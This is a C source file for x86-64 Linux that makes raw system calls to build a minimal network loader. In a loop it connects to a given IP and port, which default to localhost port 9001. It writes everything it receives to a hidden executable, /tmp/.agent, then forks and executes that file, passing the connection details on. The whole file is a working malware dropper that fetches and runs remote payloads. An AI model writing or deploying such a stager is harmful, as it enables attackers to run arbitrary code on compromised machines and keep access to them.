#include <stddef.h>

typedef unsigned int uint32_t;
typedef unsigned short uint16_t;
typedef long ssize_t;

struct sockaddr_in {
    uint16_t sin_family;
    uint16_t sin_port;
    uint32_t sin_addr;
    char sin_zero[8];
};

struct timespec {
    long tv_sec;
    long tv_nsec;
};

__asm__(
    ".global _start\n"
    "_start:\n"
    "    movq %rsp, %rdi\n"
    "    andq $-16, %rsp\n"
    "    call c_main\n"
    "    hlt\n"
);

static inline long my_syscall(long num, long a1, long a2, long a3,
                              long a4, long a5, long a6) {
    long ret;
    asm volatile (
        "mov %[a4], %%r10\n\t"
        "mov %[a5], %%r8\n\t"
        "mov %[a6], %%r9\n\t"
        "syscall"
        : "=a"(ret)
        : "a"(num), "D"(a1), "S"(a2), "d"(a3),
          [a4] "r"(a4), [a5] "r"(a5), [a6] "r"(a6)
        : "rcx", "r11", "r10", "r8", "r9", "memory"
    );
    return ret;
}

void my_exit(int status) {
    my_syscall(60, status, 0, 0, 0, 0, 0); // sys_exit
}

uint16_t my_atoi(const char* str) {
    uint16_t res = 0;
    while (*str >= '0' && *str <= '9') {
        res = res * 10 + (*str - '0');
        str++;
    }
    return ((res & 0xFF) << 8) | ((res >> 8) & 0xFF);
}

uint32_t my_inet_addr(const char* cp) {
    uint32_t val = 0;
    for (int i = 0; i < 4; i++) {
        uint32_t part = 0;
        while (*cp >= '0' && *cp <= '9') {
            part = part * 10 + (*cp - '0');
            cp++;
        }
        val |= (part << (i * 8));
        if (*cp == '.') cp++;
    }
    return val;
}

void c_main(long* stack_ptr) {
    long argc = *stack_ptr;
    char** argv = (char**)(stack_ptr + 1);

    uint32_t ip = 0x0100007F; 
    uint16_t port = 0x2923;    
    char* arg_ip = NULL;
    char* arg_port = NULL;

    if (argc >= 3) {
        arg_ip = argv[1];
        arg_port = argv[2];
        if (arg_ip && arg_port) {
            ip = my_inet_addr(arg_ip);
            port = my_atoi(arg_port);
        }
    }

    const char* drop_path = "/tmp/.agent";

    while (1) {
        long sock = my_syscall(41, 2, 1, 0, 0, 0, 0);
        if (sock < 0) {
            struct timespec ts = {5, 0};
            my_syscall(35, (long)&ts, 0, 0, 0, 0, 0);
            continue;
        }

        struct sockaddr_in addr;
        addr.sin_family = 2;
        addr.sin_port = port;
        addr.sin_addr = ip;
        for (int i = 0; i < 8; i++) addr.sin_zero[i] = 0;

        if (my_syscall(42, sock, (long)&addr, sizeof(addr), 0, 0, 0) < 0) {
            my_syscall(3, sock, 0, 0, 0, 0, 0); // sys_close
            struct timespec ts = {5, 0};
            my_syscall(35, (long)&ts, 0, 0, 0, 0, 0);
            continue;
        }

        long fd = my_syscall(2, (long)drop_path, 0x241, 0700, 0, 0, 0);
        if (fd < 0) {
            my_syscall(3, sock, 0, 0, 0, 0, 0);
            my_exit(1);
        }

        char buf;
        ssize_t bytes;
        int has_data = 0;

        while ((bytes = my_syscall(0, sock, (long)&buf, 1, 0, 0, 0)) > 0) {
            my_syscall(1, fd, (long)&buf, bytes, 0, 0, 0);
            has_data = 1;
        }

        my_syscall(3, fd, 0, 0, 0, 0, 0);
        my_syscall(3, sock, 0, 0, 0, 0, 0);

        if (has_data) {
            long pid = my_syscall(57, 0, 0, 0, 0, 0, 0);
            if (pid == 0) {
                char* pass_ip = arg_ip ? arg_ip : "127.0.0.1";
                char* pass_port = arg_port ? arg_port : "9001";
                char* next_argv[] = {
                    (char*)drop_path, 
                    pass_ip, 
                    pass_port, 
                    NULL
                };
                char* envp[] = {NULL};
                my_syscall(59, (long)drop_path, (long)next_argv, (long)envp, 0, 0, 0);
                my_exit(1); 

            }
            my_exit(0);
        }

        struct timespec ts = {5, 0};
        my_syscall(35, (long)&ts, 0, 0, 0, 0, 0);
    }
}
